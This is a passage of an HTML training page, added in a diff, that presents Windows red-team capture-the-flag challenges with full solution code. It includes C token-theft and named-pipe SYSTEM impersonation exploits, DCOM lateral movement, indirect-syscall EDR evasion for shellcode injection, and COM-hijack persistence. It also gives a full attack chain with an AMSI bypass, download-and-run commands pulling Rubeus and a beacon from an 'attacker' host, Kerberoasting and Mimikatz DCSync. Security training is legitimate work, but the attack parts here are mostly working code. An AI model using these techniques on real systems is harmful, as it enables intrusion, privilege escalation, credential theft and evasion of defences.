+Get-WmiObject -Class __Win32Provider | 
+    Where-Object { $_.CLSID -ne $null } | 
+    Select-Object Name, CLSID</code></pre>
+          <p><strong>Flag:</strong> Base64-encoded in the WQL query as a comment: <code>-- FLAG{...}</code></p>
+        </div>
+      </div>
+
+      <!-- CTF 7 -->
+      <div class="card bg-dark mb-3">
+        <div class="card-header"><h4>Challenge 7: Token Heist</h4></div>
+        <div class="card-body">
+          <p><strong>Category:</strong> Token Manipulation</p>
+          <p><strong>Difficulty:</strong> Medium-Hard</p>
+          <p><strong>Description:</strong> You're running as a low-privilege user but have SeDebugPrivilege (granted via group policy). A process running as <code>YOURCOMPANY\admin</code> exists on the system (PID given). Steal its token and access <code>\\DC01\C$\flag.txt</code>.</p>
+          <h5>Approach:</h5>
+          <pre><code class="language-c">// Token theft exploit
+#include &lt;windows.h&gt;
+#include &lt;stdio.h&gt;
+
+int main(int argc, char* argv[]) {
+    DWORD targetPid = atoi(argv[1]);
+    
+    // Enable SeDebugPrivilege
+    HANDLE hToken;
+    OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken);
+    TOKEN_PRIVILEGES tp;
+    LookupPrivilegeValueA(NULL, "SeDebugPrivilege", &tp.Privileges[0].Luid);
+    tp.PrivilegeCount = 1;
+    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+    AdjustTokenPrivileges(hToken, FALSE, &tp, 0, NULL, NULL);
+    
+    // Open target process
+    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, targetPid);
+    
+    // Get and duplicate token
+    HANDLE hProcToken, hDupToken;
+    OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_IMPERSONATE, &hProcToken);
+    DuplicateTokenEx(hProcToken, MAXIMUM_ALLOWED, NULL,
+        SecurityImpersonation, TokenPrimary, &hDupToken);
+    
+    // Impersonate
+    ImpersonateLoggedOnUser(hDupToken);
+    
+    // Now access the network resource as the stolen identity
+    // Read \\DC01\C$\flag.txt
+    HANDLE hFile = CreateFileA("\\\\DC01\\C$\\flag.txt",
+        GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
+    
+    char buf[256];
+    DWORD bytesRead;
+    ReadFile(hFile, buf, sizeof(buf), &bytesRead, NULL);
+    buf[bytesRead] = 0;
+    printf("Flag: %s\n", buf);
+    
+    RevertToSelf();
+    return 0;
+}</code></pre>
+          <p><strong>Flag:</strong> Contents of <code>\\DC01\C$\flag.txt</code></p>
+        </div>
+      </div>
+
+      <!-- CTF 8 -->
+      <div class="card bg-dark mb-3">
+        <div class="card-header"><h4>Challenge 8: DCOM Lateral Sprint</h4></div>
+        <div class="card-body">
+          <p><strong>Category:</strong> Lateral Movement</p>
+          <p><strong>Difficulty:</strong> Medium</p>
+          <p><strong>Description:</strong> You've compromised WORKSTATION01 and have domain admin credentials. The target (SERVER01) has: WinRM disabled, SMB blocked by host firewall, RDP disabled. Only RPC/DCOM ports are open. Execute a command on SERVER01 and read <code>C:\flag.txt</code>.</p>
+          <h5>Approach:</h5>
+          <pre><code class="language-powershell"># DCOM is our only option
+$cred = Get-Credential # domain admin creds
+
+# Method 1: MMC20.Application
+$com = [activator]::CreateInstance(
+    [type]::GetTypeFromProgID("MMC20.Application", "SERVER01"))
+$com.Document.ActiveView.ExecuteShellCommand(
+    "cmd.exe", $null, 
+    "/c type C:\flag.txt > C:\Users\Public\out.txt", "7")
+
+# Read the output (need to find a way back)
+# Option A: Write to a share we can access
+$com.Document.ActiveView.ExecuteShellCommand(
+    "cmd.exe", $null,
+    "/c type C:\flag.txt > \\WORKSTATION01\share\flag.txt", "7")
+
+# Method 2: ShellBrowserWindow
+$com2 = [activator]::CreateInstance(
+    [type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880", "SERVER01"))
+$com2.Document.Application.ShellExecute(
+    "cmd.exe", "/c type C:\flag.txt > \\WORKSTATION01\share\flag.txt",
+    "C:\Windows\System32", $null, 0)
+
+# Method 3: Excel (if installed)
+$excel = [activator]::CreateInstance(
+    [type]::GetTypeFromProgID("Excel.Application", "SERVER01"))
+$excel.DisplayAlerts = $false
+$wb = $excel.Workbooks.Add()
+$ws = $wb.Worksheets.Item(1)
+$ws.Cells.Item(1,1).Value = $excel.ExecuteExcel4Macro('EXEC("cmd /c type C:\flag.txt")')
+</code></pre>
+          <p><strong>Flag:</strong> Content of <code>C:\flag.txt</code> on SERVER01.</p>
+        </div>
+      </div>
+
+      <!-- CTF 9 -->
+      <div class="card bg-dark mb-3">
+        <div class="card-header"><h4>Challenge 9: Syscall Ninja</h4></div>
+        <div class="card-body">
+          <p><strong>Category:</strong> Evasion / Binary Exploitation</p>
+          <p><strong>Difficulty:</strong> Hard</p>
+          <p><strong>Description:</strong> An EDR monitors all ntdll.dll exports via inline hooks AND checks if the syscall instruction originates from ntdll.dll's address range. Implement indirect syscalls to inject shellcode into a target process without detection. The EDR writes detections to <code>C:\EDR\detections.json</code>.</p>
+          <h5>Approach:</h5>
+          <pre><code class="language-c">// Indirect Syscall implementation
+// Key: The 'syscall' instruction must execute from within ntdll's range
+
+#include &lt;windows.h&gt;
+
+// Structure to hold syscall info
+typedef struct _SYSCALL_ENTRY {
+    DWORD ssn;          // System Service Number
+    PVOID syscallAddr;  // Address of 'syscall' instruction in ntdll
+} SYSCALL_ENTRY;
+
+// Find the 'syscall' instruction within an ntdll function
+PVOID FindSyscallInstruction(PVOID ntFunc) {
+    BYTE* p = (BYTE*)ntFunc;
+    for (int i = 0; i < 32; i++) {
+        if (p[i] == 0x0F && p[i+1] == 0x05) // 'syscall' opcode
+            return &p[i];
+    }
+    return NULL;
+}
+
+// Resolve SSN + syscall addr for a function
+SYSCALL_ENTRY ResolveSyscall(const char* funcName) {
+    SYSCALL_ENTRY entry = {0};
+    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
+    BYTE* func = (BYTE*)GetProcAddress(hNtdll, funcName);
+    
+    // Walk neighbors if hooked (Halo's Gate)
+    for (int i = 0; i < 500; i++) {
+        BYTE* check = func + (i * 32);
+        if (check[0] == 0x4C && check[1] == 0x8B && check[2] == 0xD1 &&
+            check[3] == 0xB8) {
+            entry.ssn = *(DWORD*)(check + 4) - i;
+            entry.syscallAddr = FindSyscallInstruction(check);
+            return entry;
+        }
+        check = func - (i * 32);
+        if (check[0] == 0x4C && check[1] == 0x8B && check[2] == 0xD1 &&
+            check[3] == 0xB8) {
+            entry.ssn = *(DWORD*)(check + 4) + i;
+            entry.syscallAddr = FindSyscallInstruction(check);
+            return entry;
+        }
+    }
+    return entry;
+}
+
+// Assembly stub (MASM) for indirect syscall
+// .code
+// IndirectSyscall PROC
+//     mov r10, rcx
+//     mov eax, [SSN]           ; dynamic SSN
+//     jmp qword ptr [SyscallAddr]  ; jump to ntdll's syscall instruction
+// IndirectSyscall ENDP</code></pre>
+          <p><strong>Flag:</strong> Shellcode writes flag to stdout. Must not appear in <code>C:\EDR\detections.json</code>.</p>
+        </div>
+      </div>
+
+      <!-- CTF 10 -->
+      <div class="card bg-dark mb-3">
+        <div class="card-header"><h4>Challenge 10: The COM Mansion</h4></div>
+        <div class="card-body">
+          <p><strong>Category:</strong> Persistence / COM Abuse</p>
+          <p><strong>Difficulty:</strong> Medium</p>
+          <p><strong>Description:</strong> Establish persistence on the target machine that: (1) survives reboots, (2) executes as the logged-in user, (3) doesn't use Registry Run keys, Scheduled Tasks, or Services (those are monitored). The flag is given when your persistence mechanism successfully calls back after a simulated reboot.</p>
+          <h5>Approach:</h5>
+          <pre><code class="language-powershell"># COM Hijacking persistence
+# Step 1: Find a CLSID that explorer.exe loads at logon
+# Use ProcMon or known-good CLSIDs
+
+# Target: {BCDE0395-E52F-467C-8E3D-C4579291692E} (MMDeviceEnumerator)
+# This is loaded by explorer.exe on every logon for audio
+
+$clsid = "{BCDE0395-E52F-467C-8E3D-C4579291692E}"
+$dllPath = "C:\Users\Public\beacon.dll"
+
+# Step 2: Create HKCU override (takes precedence over HKLM)
+New-Item -Path "HKCU:\Software\Classes\CLSID\$clsid\InprocServer32" -Force
+Set-ItemProperty -Path "HKCU:\Software\Classes\CLSID\$clsid\InprocServer32" `
+    -Name "(default)" -Value $dllPath -Force
+Set-ItemProperty -Path "HKCU:\Software\Classes\CLSID\$clsid\InprocServer32" `
+    -Name "ThreadingModel" -Value "Both" -Force
+
+# Step 3: Create the DLL (proxy DLL that loads original + executes payload)
+# The DLL should:
+# a) Forward all exports to the real DLL (DLL proxying)
+# b) Execute payload in DllMain (or a thread)
+# c) Be very small and not crash the host process
+
+# Verify: kill explorer, restart → callback received
+
+# Alternative: Script-based COM persistence
+# Register a COM object with LocalServer32 pointing to a script:
+$clsid2 = "{00000001-0000-0000-0000-000000000001}" # custom CLSID
+New-Item -Path "HKCU:\Software\Classes\CLSID\$clsid2\LocalServer32" -Force
+Set-ItemProperty -Path "HKCU:\Software\Classes\CLSID\$clsid2\LocalServer32" `
+    -Name "(default)" -Value "powershell.exe -ep bypass -f C:\Users\Public\cb.ps1"
+
+# Then register a task-handler or use TreatAs to redirect a commonly-used CLSID</code></pre>
+          <p><strong>Flag:</strong> Provided by the challenge server upon successful callback after reboot simulation.</p>
+        </div>
+      </div>
+
+      <!-- CTF 11 -->
+      <div class="card bg-dark mb-3">
+        <div class="card-header"><h4>Challenge 11: Pipe Dreams</h4></div>
+        <div class="card-body">
+          <p><strong>Category:</strong> Named Pipes / Privilege Escalation</p>
+          <p><strong>Difficulty:</strong> Hard</p>
+          <p><strong>Description:</strong> A custom service runs as SYSTEM and periodically connects to <code>\\.\pipe\UpdateSvc</code> to check for updates. The pipe doesn't exist yet. Race the service to create the pipe first, impersonate the SYSTEM token, and read <code>C:\SYSTEM_FLAG.txt</code>.</p>
+          <h5>Approach:</h5>
+          <pre><code class="language-c">// Solution: Create the pipe before the service does
+#include &lt;windows.h&gt;
+#include &lt;stdio.h&gt;
+
+int main() {
+    // Race: create the pipe before the SYSTEM service
+    HANDLE hPipe = CreateNamedPipeA(
+        "\\\\.\\pipe\\UpdateSvc",
+        PIPE_ACCESS_DUPLEX | FILE_FLAG_FIRST_PIPE_INSTANCE,
+        PIPE_TYPE_BYTE | PIPE_WAIT,
+        1, 4096, 4096, 0, NULL);
+    
+    if (hPipe == INVALID_HANDLE_VALUE) {
+        printf("[-] Failed to create pipe (already exists?): %d\n", GetLastError());
+        return 1;
+    }
+    printf("[+] Pipe created, waiting for SYSTEM service to connect...\n");
+    
+    // Wait for the service's connection
+    if (!ConnectNamedPipe(hPipe, NULL)) {
+        printf("[-] ConnectNamedPipe failed: %d\n", GetLastError());
+        return 1;
+    }
+    printf("[+] SYSTEM service connected!\n");
+    
+    // Impersonate
+    if (!ImpersonateNamedPipeClient(hPipe)) {
+        printf("[-] Impersonation failed: %d\n", GetLastError());
+        return 1;
+    }
+    printf("[+] Impersonating SYSTEM!\n");
+    
+    // Read the flag
+    HANDLE hFile = CreateFileA("C:\\SYSTEM_FLAG.txt",
+        GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
+    char flag[256] = {0};
+    DWORD read;
+    ReadFile(hFile, flag, sizeof(flag)-1, &read, NULL);
+    printf("[+] Flag: %s\n", flag);
+    
+    RevertToSelf();
+    CloseHandle(hFile);
+    CloseHandle(hPipe);
+    return 0;
+}</code></pre>
+          <p><strong>Flag:</strong> Contents of <code>C:\SYSTEM_FLAG.txt</code></p>
+          <p><strong>Bonus:</strong> Implement a persistent version that recreates the pipe after each connection (loop with DisconnectNamedPipe).</p>
+        </div>
+      </div>
+
+      <!-- CTF 12 -->
+      <div class="card bg-dark mb-3">
+        <div class="card-header"><h4>Challenge 12: Full Chain - Initial Access to Domain Admin</h4></div>
+        <div class="card-body">
+          <p><strong>Category:</strong> Full Attack Chain</p>
+          <p><strong>Difficulty:</strong> Hard</p>
+          <p><strong>Description:</strong> Starting from a phishing payload landing on a workstation, chain multiple techniques to reach Domain Admin. Environment: AD domain with 3 machines (WS01, SRV01, DC01).</p>
+          <h5>Attack Chain:</h5>
+          <ol>
+            <li><strong>Initial Access:</strong> MSBuild payload via macro-enabled document</li>
+            <li><strong>Execution:</strong> AMSI bypass → in-memory C# assembly load</li>
+            <li><strong>Persistence:</strong> COM hijacking (survives reboot)</li>
+            <li><strong>Priv Esc:</strong> Potato attack (service account) or UAC bypass (admin user)</li>
+            <li><strong>Credential Access:</strong> LSASS dump via direct syscalls (avoid EDR)</li>
+            <li><strong>Lateral Movement:</strong> DCOM to SRV01 using stolen creds</li>
+            <li><strong>Domain Escalation:</strong> Kerberoast a service account → crack → DCSync</li>
+          </ol>
+          <pre><code class="language-powershell"># Phase 1: Initial foothold (on WS01)
+# Macro drops MSBuild .csproj, executes shellcode in memory
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe C:\Users\Public\build.csproj
+
+# Phase 2: AMSI/ETW bypass + load tooling
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+IEX (New-Object Net.WebClient).DownloadString('http://attacker/Rubeus.ps1')
+
+# Phase 3: Enumerate for lateral movement targets
+# Find where admins are logged in
+Invoke-UserHunter -CheckAccess
+
+# Phase 4: Kerberoast
+Invoke-Rubeus kerberoast /outfile:hashes.txt
+# Crack offline: hashcat -m 13100 hashes.txt wordlist.txt
+
+# Phase 5: Lateral movement to SRV01 via DCOM
+$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","SRV01"))
+$com.Document.ActiveView.ExecuteShellCommand("powershell",""," -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://attacker/beacon.ps1')","")
+
+# Phase 6: DCSync (from DA context)
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:domain\krbtgt"'
+
+# Final: Read the flag
+type \\DC01\C$\DomainAdmin_Flag.txt</code></pre>
+          <p><strong>Flag:</strong> <code>\\DC01\C$\DomainAdmin_Flag.txt</code></p>
+        </div>
+      </div>
+
+    </div><!-- end CTF tab -->
+
+  </div><!-- end tab-content -->
+
+</div>
+</body>
+</html>
